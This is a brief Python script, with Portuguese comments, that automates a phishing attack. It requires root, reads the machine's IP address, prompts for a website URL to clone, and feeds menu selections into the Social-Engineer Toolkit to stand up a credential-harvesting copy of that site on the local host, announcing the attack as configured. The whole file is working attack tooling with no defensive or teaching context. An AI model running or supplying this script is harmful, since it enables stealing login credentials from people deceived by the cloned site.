import os
import subprocess

def run_phishing():
    # Verifica se o script está sendo executado como root
    if os.geteuid() != 0:
        print("Este script precisa ser executado como root. Use 'sudo'.")
        return

    # Verifica se o setoolkit está instalado
    if not subprocess.run(["which", "setoolkit"], stdout=subprocess.PIPE).stdout.strip():
        print("SET não está instalado. Por favor, execute o script 'setup_environment.py' antes.")
        return

    # Obtém o IP da máquina
    result = subprocess.run(["ifconfig"], stdout=subprocess.PIPE, text=True)
    ip_line = next((line for line in result.stdout.splitlines() if "inet " in line and "127.0.0.1" not in line), None)
    ip = ip_line.split()[1] if ip_line else None

    if not ip:
        print("Erro ao obter o endereço IP. Certifique-se de que sua rede está configurada corretamente.")
        return

    # Solicita a URL alvo ao usuário
    target_url = input("Digite a URL do site que será clonado (ex.: http://example.com): ").strip()
    if not target_url.startswith("http://") and not target_url.startswith("https://"):
        print("URL inválida. Certifique-se de incluir 'http://' ou 'https://'.")
        return

    print(f"URL alvo configurada: {target_url}")
    print(f"Endereço IP local: {ip}")

    # Executa o SET Toolkit com as configurações
    set_toolkit_input = f"1\n2\n3\n2\n{ip}\n{target_url}\n"
    subprocess.run(["setoolkit"], input=set_toolkit_input, text=True)
    print(f"Ataque configurado. O site clonado está disponível em: http://{ip}")

if __name__ == "__main__":
    run_phishing()
